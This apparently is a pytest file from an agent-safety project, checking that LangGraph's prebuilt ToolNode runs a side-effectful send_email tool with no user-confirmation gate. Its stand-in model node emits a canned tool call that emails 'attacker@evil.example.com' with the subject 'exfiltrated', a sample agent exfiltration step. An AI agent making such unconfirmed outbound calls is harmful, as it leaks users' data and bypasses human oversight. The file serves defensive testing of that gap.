"""Empirical check: does LangGraph's prebuilt tool-calling path execute a
side-effectful tool with no confirmation gate?

This is NOT a test of Custos's own LangGraph runtime (agent_loop_langgraph.py
hand-rolls its own gating node specifically so it does not rely on this
prebuilt path). It is a standalone demonstration of what a developer gets by
following LangGraph's own quickstart tutorial ("Build a basic chatbot" /
"Add tools") with zero custom gating logic: `ToolNode` + `tools_condition`.
`create_react_agent` (`langgraph.prebuilt.create_react_agent`) is not tested
directly here because it requires a LangChain chat-model wrapper we do not
otherwise depend on, but its own docstring says it "uses `ToolNode`
internally with sensible defaults for the agent loop, conditional routing,
and error handling" -- so this test exercises the shared root cause.

PINNED VERSIONS this observation was made against (see pyproject.toml /
`pip show`): langgraph==1.2.9, langgraph-prebuilt==1.1.0,
langchain-core==1.5.1. If this test starts failing (i.e. the tool no longer
executes unconditionally), LangGraph's prebuilt behavior has changed and the
"headline finding" in docs/decisions/006-agent-runtime.md needs rechecking
against the new version, not silently kept.

Uses the REAL SendEmailTool from custos.tools.send_email (the same
side-effectful, simulated tool the action-gating evals gate), wrapped as a
plain LangGraph/LangChain tool function, so this is not a strawman tool.
"""

from __future__ import annotations

from typing import Any

from langchain_core.messages import AIMessage, HumanMessage
from langgraph.graph import END, START, MessagesState, StateGraph
from langgraph.prebuilt import ToolNode, tools_condition

from custos.tools.send_email import SendEmailTool

_send_email_tool = SendEmailTool()
_execution_log: list[dict[str, Any]] = []


def send_email(to: str, subject: str, body: str) -> str:
    """Send an email to a recipient. Use this to email information to someone."""
    _execution_log.append({"to": to, "subject": subject, "body": body})
    result = _send_email_tool.run({"to": to, "subject": subject, "body": body})
    return str(result.output)


def _fake_model_node(state: MessagesState) -> dict[str, Any]:
    """Stand-in for the LLM call.

    Returns a canned AIMessage with a tool_calls entry for the
    side-effectful `send_email` tool -- exactly the shape Anthropic's API
    (and the mocked-LLM fixtures in evals/suites/action_gating.py) return
    when the model decides to call a tool. No custom gating logic anywhere
    in this graph; this is the smallest graph the LangGraph "Add tools"
    tutorial teaches: a model node, `ToolNode`, and `tools_condition`.
    """
    return {
        "messages": [
            AIMessage(
                content="",
                tool_calls=[
                    {
                        "name": "send_email",
                        "args": {
                            "to": "attacker@evil.example.com",
                            "subject": "exfiltrated",
                            "body": "sent with no confirmation step",
                        },
                        "id": "call_1",
                        "type": "tool_call",
                    }
                ],
            )
        ]
    }


def _build_minimal_prebuilt_graph() -> Any:
    graph = StateGraph(MessagesState)
    graph.add_node("chatbot", _fake_model_node)
    graph.add_node("tools", ToolNode([send_email]))
    graph.add_edge(START, "chatbot")
    graph.add_conditional_edges("chatbot", tools_condition)
    graph.add_edge("tools", END)
    return graph.compile()


def test_prebuilt_toolnode_executes_side_effectful_tool_with_no_gate() -> None:
    """The minimal ToolNode + tools_condition graph executes send_email
    immediately, in the same graph.invoke() call, with no pause for
    confirmation and no PendingAction-equivalent step.

    Custos's hard requirement (THREAT_MODEL.md T6) is that side-effectful
    tools NEVER execute without explicit user confirmation, and that the
    gate is on execution, not on the model's request. This test proves
    that requirement does NOT hold for LangGraph's prebuilt tool-execution
    path by default -- which is exactly why agent_loop_langgraph.py does
    not use ToolNode or create_react_agent, and hand-writes its own gating
    node instead.
    """
    _execution_log.clear()
    compiled = _build_minimal_prebuilt_graph()

    result = compiled.invoke({"messages": [HumanMessage("email my PTO summary")]})

    # OBSERVED: the tool ran, unconditionally, inside this single invoke().
    assert len(_execution_log) == 1, (
        "Expected the prebuilt path to execute send_email exactly once "
        "with no gate; got a different call count, which means this "
        "version of LangGraph's prebuilt ToolNode behaves differently "
        "than pinned (langgraph==1.2.9) -- recheck the ADR claim."
    )
    assert _execution_log[0]["to"] == "attacker@evil.example.com"

    tool_messages = [m for m in result["messages"] if type(m).__name__ == "ToolMessage"]
    assert len(tool_messages) == 1
    assert "(simulated)" in str(tool_messages[0].content)
    # No confirmation-shaped interrupt, no PendingAction: the graph ran to
    # completion in one invoke() with the tool already executed.
